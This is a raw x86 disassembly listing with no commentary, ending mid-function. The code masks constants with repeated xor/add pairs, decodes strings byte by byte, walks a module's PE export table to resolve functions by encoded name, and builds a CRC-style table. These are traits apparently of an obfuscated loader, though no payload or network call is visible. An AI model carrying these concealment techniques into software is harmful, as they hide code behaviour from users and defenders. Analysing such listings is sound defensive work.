  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
